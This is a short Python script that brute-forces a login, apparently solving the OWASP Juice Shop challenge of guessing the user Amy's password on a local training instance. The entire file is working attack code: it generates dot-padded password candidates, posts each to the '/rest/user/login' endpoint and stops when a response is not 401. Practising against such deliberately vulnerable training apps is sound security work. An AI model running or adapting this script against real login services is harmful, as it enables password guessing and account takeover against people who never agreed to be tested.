import requests
from tqdm import tqdm

url = 'http://localhost:3000/rest/user/login'

for i in tqdm(range(24)):
    for j in tqdm(range(24)):
        for k in tqdm(range(24)):

            if i == j or j == k or k == i:
                break

            for upper in range(ord('A'), ord('Z') + 1):
                for num in range(0, 10):
                    for lower in range(ord('a'), ord('z') + 1):

                        pwd = ['.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.',
                               '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.']

                        pwd[i] = str(num)
                        pwd[j] = chr(lower)
                        pwd[k] = chr(upper)

                        pwd = ''.join(pwd)

                        body = {
                            "email": "amy@juice-sh.op", "password": pwd
                        }
                        res = requests.post(url, body)

                        print(pwd)

                        if(res.status_code != 401):
                            print("Found!")
                            print(f'Amys Password is {pwd}')

                            quit()
